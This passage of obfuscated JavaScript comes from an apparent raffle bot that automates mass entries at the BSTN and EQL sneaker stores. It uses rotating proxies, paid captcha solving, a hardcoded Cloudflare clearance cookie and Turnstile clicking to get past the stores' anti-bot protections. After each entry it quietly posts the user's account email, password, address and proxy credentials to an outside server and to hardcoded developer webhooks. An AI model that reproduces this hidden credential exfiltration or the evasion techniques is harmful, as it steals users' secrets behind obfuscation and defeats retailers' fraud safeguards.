                                _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x5bb088['errorDEVMSG']), await _0x5f1090(_0x32737e, _0x5bb088['errorDEVMSG']);
                            } finally {
                                if (_0x20fec1)
                                    _0x20fec1['close']();
                                if (_0x15dc65 == 'yes' && _0x1f1e8c != 0x5)
                                    return console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f1e8c + '\x20/\x205)')), _0x2443e3--, _0x1f1e8c = _0x1f1e8c + 0x1, _0xc0124f(_0x413c29, _0xdf7ce1, _0x4d06c9, _0x147a40, _0x1f1e8c);
                                _0x15dc65 == 'yes' && _0x1f1e8c >= 0x5 && (_0x15dc65 = 'no', _0x1f1e8c = 0x0), _0x2443e3--, console['log'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                            }
                        }
                        if (_0x898dc3 == _0x3a51ff['length'] - 0x1) {
                            await _0xc0124f(_0x2062aa, _0x3a51ff, _0x39d5b3, _0x898dc3, 0x0);
                            return;
                        }
                        _0xc0124f(_0x2062aa, _0x3a51ff, _0x39d5b3, _0x898dc3, 0x0), await _0x2121c3(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x563392, _0x139337, _0xaf4cdf) {
                    var _0x49632a = 0x0, _0x405f12 = _0x139337;
                    for (var _0x116892 = 0x0; _0x116892 < _0x139337['length']; _0x116892++) {
                        maxTasks = Number(_0x120b49['threads']);
                        while (_0x49632a >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        let _0x2b17b0 = ![];
                        async function _0x44e5a(_0x4560f3, _0x265689, _0x2c0ed7, _0x2a9ca6, _0x5ec213) {
                            _0x49632a++, _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x120b49['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2fc821, _0x5c13b5 = _0x265689[_0x2a9ca6];
                            try {
                                await _0x30a360(_0x265689, _0x2a9ca6);
                            } catch {
                                _0x20dd78 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x3b9212(_0x3129e9) {
                                const _0x571e46 = _0x190b67['readFileSync']('../successful-tasks.csv', 'utf8'), _0x9e5da6 = _0x32de35['parse'](_0x571e46, { 'header': !![] })['data'];
                                let _0x5b2ebe = ![];
                                for (var _0x515f30 of _0x9e5da6) {
                                    if (_0x515f30['Url'] == _0x3129e9['Url'] && _0x515f30['Email'] == _0x3129e9['Email']) {
                                        _0x5b2ebe = !![];
                                        break;
                                    }
                                }
                                return _0x5b2ebe;
                            }
                            _0x3aeb59(_0x4560f3['name'] + '\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20/\x20' + _0x265689['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                            var _0x3e5121 = Math['round'](Math['random']() * (_0x2c0ed7['length'] - 0x1)), _0x501a04 = _0x2c0ed7[_0x3e5121]['split'](':'), _0x392929;
                            let _0x3f6c8c = ![], _0x20dd78 = 'no';
                            try {
                                if (await _0x3b9212(_0x265689[_0x2a9ca6]) == !![]) {
                                    console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3f6c8c = !![], _0x2b17b0 = !![];
                                    return;
                                }
                                try {
                                    _0x392929 = await _0x586b7d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x501a04[0x0] + ':' + _0x501a04[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x392929 = await _0x586b7d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x501a04[0x0] + ':' + _0x501a04[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x42635e = await _0x392929['newPage'](), _0x399ca1 = await _0x42635e['target']()['createCDPSession'](), { windowId: _0x5c86dc } = await _0x399ca1['send']('Browser.getWindowForTarget');
                                await _0x42635e['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x35ffd6 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x42635e['authenticate']({
                                    'username': '' + _0x501a04[0x2],
                                    'password': '' + _0x501a04[0x3]
                                }), console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42635e['goto']('' + _0x265689[_0x2a9ca6]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2121c3(0x1388);
                                var _0x330058 = await _0x42635e['$']('#turnstile-wrapper');
                                if (_0x330058) {
                                    console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2121c3(0x2710);
                                    const _0x405eef = await _0x42635e['$']('#turnstile-wrapper');
                                    if (_0x405eef)
                                        try {
                                            await _0x405eef['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x42635e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x1f95ec = await _0x42635e['$']('#turnstile-wrapper');
                                        if (_0x1f95ec)
                                            try {
                                                await _0x1f95ec['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x42635e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x399ca1['send']('Browser.setWindowBounds', {
                                    'windowId': _0x5c86dc,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x2121c3(0x1388), await _0x42635e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x42635e['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Logging\x20in'), await _0x42635e['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x4f1ed8 => _0x4f1ed8['click']()), await _0x42635e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x42635e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2121c3(0x7d0), await _0x42635e['waitForSelector']('#email-login'), await _0x42635e['type']('#email-login', '' + _0x265689[_0x2a9ca6]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x2121c3(0xdac), await _0x42635e['waitForSelector']('#password'), await _0x42635e['type']('#password', '' + _0x265689[_0x2a9ca6]['Password'], { 'delay': 0xe6 }), await _0x2121c3(0x157c);
                                try {
                                    await _0x42635e['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x48d600 => _0x48d600['click']());
                                } catch {
                                }
                                try {
                                    await _0x42635e['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x1ace4e) {
                                }
                                await _0x2121c3(0x3e8);
                                const _0x5b094e = await _0x42635e['$']('.enteredDraw_container__2KmQ_');
                                if (_0x5b094e) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x265689[_0x2a9ca6]['Size']);
                                try {
                                    if (_0x265689[_0x2a9ca6]['Size'] != 'RANDOM') {
                                        var _0x566e76 = _0x265689[_0x2a9ca6]['Size']['replace']('.', ',');
                                        const _0x50208a = await _0x42635e['$x']('//div[contains(text(),\x20\x27' + _0x566e76 + '\x27)]');
                                        await _0x50208a[0x0]['click']();
                                    } else {
                                        const _0x209817 = await _0x42635e['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x240b5e = Math['round'](Math['random']() * (_0x209817['length'] - 0x1));
                                        await _0x209817[_0x240b5e]['click']();
                                    }
                                } catch (_0x2f3c71) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x2121c3(0x1f4);
                                const _0x34231c = await _0x42635e['$']('.addressList_addressItem__LE2PB');
                                if (_0x34231c && _0x265689[_0x2a9ca6]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x42635e['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x2121c3(0x5dc), await _0x42635e['waitForSelector']('#firstname'), await _0x42635e['type']('#firstname', '' + _0x265689[_0x2a9ca6]['FirstName']), await _0x2121c3(0x1f4), await _0x42635e['waitForSelector']('#firstname'), await _0x42635e['type']('#lastname', '' + _0x265689[_0x2a9ca6]['LastName']), await _0x2121c3(0x1f4), await _0x42635e['waitForSelector']('#firstname'), await _0x42635e['type']('#street', '' + _0x265689[_0x2a9ca6]['Address1']), await _0x2121c3(0x1f4), await _0x42635e['waitForSelector']('#firstname'), await _0x42635e['type']('#houseNumber', _0x265689[_0x2a9ca6]['HouseNumber'] + '\x20' + _0x265689[_0x2a9ca6]['Address2']), await _0x2121c3(0x1f4), await _0x42635e['waitForSelector']('#firstname'), await _0x42635e['select']('#country_code', '' + _0x265689[_0x2a9ca6]['Country']), await _0x2121c3(0x1f4), await _0x42635e['type']('#postcode', '' + _0x265689[_0x2a9ca6]['Zip']), await _0x2121c3(0x1f4), await _0x42635e['type']('#city', '' + _0x265689[_0x2a9ca6]['City']), await _0x2121c3(0x1f4), await _0x42635e['type']('#telephone', '' + _0x265689[_0x2a9ca6]['Phone']), await _0x2121c3(0x1f4), await _0x42635e['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x2121c3(0x9c4);
                                try {
                                    await _0x42635e['type']('#instagram_name', '' + _0x265689[_0x2a9ca6]['Follower']), await _0x42635e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2121c3(0x5dc);
                                try {
                                    await _0x42635e['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x2121c3(0x5dc), await _0x42635e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2c8d42 => _0x2c8d42['click']()), await _0x2121c3(0x1388);
                                try {
                                    await _0x42635e['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x42635e['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x265689[_0x2a9ca6]['Size'] != 'RANDOM') {
                                        var _0x566e76 = _0x265689[_0x2a9ca6]['Size']['replace']('.', ',');
                                        const _0x4d0406 = await _0x42635e['$x']('//div[contains(text(),\x20' + _0x566e76 + ')]');
                                        await _0x4d0406[0x0]['click']();
                                    } else {
                                        const _0x5bdc0b = await _0x42635e['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x240b5e = Math['round'](Math['random']() * (_0x5bdc0b['length'] - 0x1));
                                        await _0x5bdc0b[_0x240b5e]['click']();
                                    }
                                    await _0x2121c3(0x5dc);
                                    try {
                                        await _0x42635e['hover']('#instagram_name'), await _0x42635e['type']('#instagram_name', '' + _0x265689[_0x2a9ca6]['Follower']), await _0x42635e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5ec213 + '\x20/\x205)');
                                    try {
                                        await _0x42635e['hover']('.checkBox_boxHolder__wLGVe'), await _0x2121c3(0x5dc), await _0x42635e['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x2121c3(0x157c), await _0x42635e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2d9d71 => _0x2d9d71['click']()), await _0x2121c3(0x1388), await _0x42635e['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x20dd78 = 'no', _0x1ded45(_0x265689[_0x2a9ca6], _0x4560f3);
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x19010a),
                                        'proxy': '' + _0x2c0ed7[_0x2a9ca6]
                                    };
                                    var _0x1b6fbd = JSON['stringify'](prxdata);
                                    let _0x12b26f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x1b6fbd, _0x12b26f);
                                } catch (_0x2a645f) {
                                }
                                console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x4b1ab7 = await _0x12b988(_0x265689[_0x2a9ca6], _0x4560f3, 'dev', ![]), _0x84ef0d = await _0x12b988(_0x265689[_0x2a9ca6], _0x4560f3, 'pub', ![]);
                                const _0x4767cb = {
                                    'succesDEVMSG': { 'embeds': [_0x4b1ab7] },
                                    'succesPUBMSG': { 'embeds': [_0x84ef0d] }
                                };
                                let _0x19010a = _0x265689[_0x2a9ca6];
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'module': _0x4560f3['name'],
                                        'entrydata': JSON['stringify'](_0x19010a),
                                        'proxy': '' + _0x2c0ed7[_0x2a9ca6]
                                    };
                                    var _0x1b6fbd = JSON['stringify'](prxdata);
                                    let _0x52b761 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x1b6fbd, _0x52b761);
                                } catch (_0x263f07) {
                                }
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x4767cb['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x4767cb['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x4767cb['succesPUBMSG']);
                                } catch (_0x35c1b8) {
                                    console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x35c1b8));
                                }
                            } catch (_0xe3d27d) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20' + _0xe3d27d)), _0x20dd78 = 'yes', _0x2fc821 = '' + _0xe3d27d;
                                var _0xbd2bb0 = await _0x12b988(_0x265689[_0x2a9ca6], _0x4560f3, 'dev', !![], _0x2fc821), _0x4b1ab7 = await _0x12b988(_0x265689[_0x2a9ca6], _0x4560f3, 'dev', ![]), _0x84ef0d = await _0x12b988(_0x265689[_0x2a9ca6], _0x4560f3, 'pub', ![]);
                                const _0xd832c6 = {
                                    'succesDEVMSG': { 'embeds': [_0x4b1ab7] },
                                    'succesPUBMSG': { 'embeds': [_0x84ef0d] }
                                };
                                _0xd832c6['errorDEV'] = { 'embeds': [_0xbd2bb0] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0xd832c6['errorDEV']), await _0x5f1090(_0x32737e, _0xd832c6['errorDEV']);
                            } finally {
                                _0x392929 && _0x392929['close']();
                                if (_0x20dd78 == 'yes' && _0x5ec213 != 0x5)
                                    return console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Task\x20' + (_0x2a9ca6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5ec213 + '\x20/\x205)')), _0x5ec213 = _0x5ec213 + 0x1, _0x49632a--, _0x44e5a(_0x4560f3, _0x265689, _0x2c0ed7, _0x2a9ca6, _0x5ec213);
                                _0x20dd78 == 'yes' && _0x5ec213 >= 0x5 && _0x17abd2(_0x265689[_0x2a9ca6], _0x4560f3), !_0x3f6c8c && (console['log'](_0x29f6be() + '\x20[' + _0x4560f3['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay'])), _0x49632a--;
                            }
                        }
                        _0x44e5a(_0x563392, _0x405f12, _0xaf4cdf, _0x116892, 0x0), await _0x2121c3(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x527262, _0x2a6ad2) {
                    var _0x5b7706 = 0x0, _0x28c841;
                    try {
                        const _0x41ede4 = _0x190b67['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x28c841 = _0x32de35['parse'](_0x41ede4, { 'header': !![] })['data'];
                    } catch (_0x4d7461) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0xc2c1cd = 0x0; _0xc2c1cd < _0x28c841['length']; _0xc2c1cd++) {
                        maxTasks = Number(_0x120b49['threads']);
                        while (_0x5b7706 >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        async function _0x1a125d(_0x3bd854, _0x443cd6, _0x4e4bc4, _0x118811, _0x28dc46) {
                            _0x5b7706++, _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x120b49['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x3719f8 != 'yes')
                                var _0x3719f8 = '', _0x28dc46 = 0x0;
                            var _0x20f215;
                            _0x3aeb59(_0x3bd854['name'] + '\x20Task\x20' + (_0x118811 + 0x1) + '\x20/\x20' + _0x4e4bc4['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                            var _0x3f95a3 = await _0x12b988(_0x4e4bc4[_0x118811], _0x3bd854, 'acc', ![]);
                            const _0x4338ba = { 'succesDEVMSG': { 'embeds': [_0x3f95a3] } }, _0x152a5c = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x5d96ac = Math['round'](Math['random']() * (_0x443cd6['length'] - 0x1)), _0x3a7ac3 = _0x443cd6[_0x5d96ac]['split'](':'), _0x1fa827;
                            try {
                                _0x1fa827 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3a7ac3[0x0] + ':' + _0x3a7ac3[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x1fa827 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3a7ac3[0x0] + ':' + _0x3a7ac3[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20Checking\x20' + _0x4e4bc4[_0x118811]['Email']);
                                const _0xc6942b = await _0x1fa827['newPage']();
                                await _0xc6942b['authenticate']({
                                    'username': '' + _0x3a7ac3[0x2],
                                    'password': '' + _0x3a7ac3[0x3]
                                }), console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc6942b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xc6942b['setRequestInterception'](!![]), _0xc6942b['on']('request', _0x12cd9f => {
                                    _0x12cd9f['resourceType']() === 'image' ? _0x12cd9f['abort']() : _0x12cd9f['continue']();
                                });
                                try {
                                    await _0xc6942b['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0xc6942b['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x3719f8 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0xc6942b['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2121c3(0x3e8), await _0xc6942b['type']('#email', _0x4e4bc4[_0x118811]['Email']), await _0x2121c3(0x1f4), await _0xc6942b['type']('#pass', _0x4e4bc4[_0x118811]['Password']), await _0x2121c3(0x1f4), await _0xc6942b['$eval']('#login-form', _0x542ffd => _0x542ffd['submit']());
                                try {
                                    await _0xc6942b['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x2121c3(0x190);
                                const _0x2c384e = await _0xc6942b['evaluate'](() => {
                                    const _0x476d21 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x476d21['map'](_0x3efb3b => _0x3efb3b['alt']);
                                }), _0x4456b7 = await _0xc6942b['evaluate'](() => {
                                    const _0x203ae0 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x203ae0['map'](_0x83a65e => _0x83a65e['innerHTML']);
                                }), _0x2cfd4c = await _0xc6942b['$$']('.raffle-winner');
                                if (_0x2cfd4c['length'] < 0x1) {
                                    console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x3719f8 = 'no';
                                    return;
                                }
                                console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20' + _0x2cfd4c['length'] + '\x20Wins\x20Found!');
                                for (var _0xc33a79 = 0x0; _0xc33a79 < _0x2cfd4c['length']; _0xc33a79++) {
                                    console['log'](_0x136200['green'](_0x2c384e[_0xc33a79] + _0x4456b7[_0xc33a79]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0xdcc16d) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20' + _0xdcc16d)), _0x20f215 = '' + _0xdcc16d;
                                var _0x363e5c = await _0x12b988(_0x4e4bc4[_0x118811], _0x3bd854, 'acc', !![], _0x20f215);
                                _0x4338ba['errorDEV'] = { 'embeds': [_0x363e5c] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x4338ba['errorDEV']), await _0x5f1090(_0x32737e, _0x4338ba['errorDEV']), _0x3719f8 = 'yes';
                            } finally {
                                if (_0x1fa827)
                                    _0x1fa827['close']();
                                if (_0x3719f8 == 'yes' && _0x28dc46 != 0x5)
                                    return console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Task\x20' + (_0x118811 + 0x1) + '\x20:\x20Retrying\x20(' + _0x28dc46 + '\x20/\x205)')), _0x5b7706--, _0x28dc46 = _0x28dc46 + 0x1, _0x1a125d(_0x3bd854, _0x443cd6, _0x4e4bc4, _0x118811, _0x28dc46);
                                _0x3719f8 == 'yes' && _0x28dc46 >= 0x5 && (_0x17abd2(_0x4e4bc4[_0x118811], _0x3bd854), _0x3719f8 = 'no', _0x28dc46 = 0x0), console['log'](_0x29f6be() + '\x20[' + _0x3bd854['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']), _0x5b7706--;
                            }
                        }
                        _0x1a125d(_0x527262, _0x2a6ad2, _0x28c841, _0xc2c1cd, 0x0), await _0x2121c3(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x28259b, _0x4df74a, _0x22b3e1) {
                _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x120b49['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4de0d8 = 0x0; _0x4de0d8 < _0x4df74a['length']; _0x4de0d8++) {
                    var _0x36f921;
                    _0x3aeb59(_0x28259b['name'] + '\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20/\x20' + _0x4df74a['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                    try {
                        await _0x30a360(_0x4df74a, _0x4de0d8);
                    } catch {
                        _0x183baf = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x5f58af(_0x5ae2ec) {
                        const _0x2b5520 = _0x190b67['readFileSync']('../successful-tasks.csv', 'utf8'), _0x9a71a9 = _0x32de35['parse'](_0x2b5520, { 'header': !![] })['data'];
                        let _0xdd9e57 = ![];
                        for (var _0x1850ac of _0x9a71a9) {
                            if (_0x1850ac['Url'] == _0x5ae2ec['Url'] && _0x1850ac['Email'] == _0x5ae2ec['Email']) {
                                _0xdd9e57 = !![];
                                break;
                            }
                        }
                        return _0xdd9e57;
                    }
                    if (await _0x5f58af(_0x4df74a[_0x4de0d8]) == !![]) {
                        console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xb8bc0d = ![];
                    const _0x16da20 = _0x190b67['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x587c8f = _0x32de35['parse'](_0x16da20, { 'header': !![] })['data'];
                    for (var _0x4b5cf6 of _0x587c8f) {
                        _0x4b5cf6['Email'] == _0x4df74a[_0x4de0d8]['Email'] && (_0xb8bc0d = !![]);
                    }
                    if (_0xb8bc0d == ![]) {
                        var _0x3600f7;
                        if (_0x4df74a[_0x4de0d8]['Url']['endsWith']('/')) {
                            _0x3600f7 = _0x4df74a[_0x4de0d8]['Url'] + 'register';
                            if (_0x183baf != 'yes')
                                var _0x183baf = '', _0x554fb1 = 0x0;
                        } else {
                            _0x3600f7 = _0x4df74a[_0x4de0d8]['Url'] + '/register';
                            if (_0x183baf != 'yes')
                                var _0x183baf = '', _0x554fb1 = 0x0;
                        }
                        if (_0x4df74a[_0x4de0d8]['Email'] == '' || _0x4df74a[_0x4de0d8]['FirstName'] == '' || _0x4df74a[_0x4de0d8]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
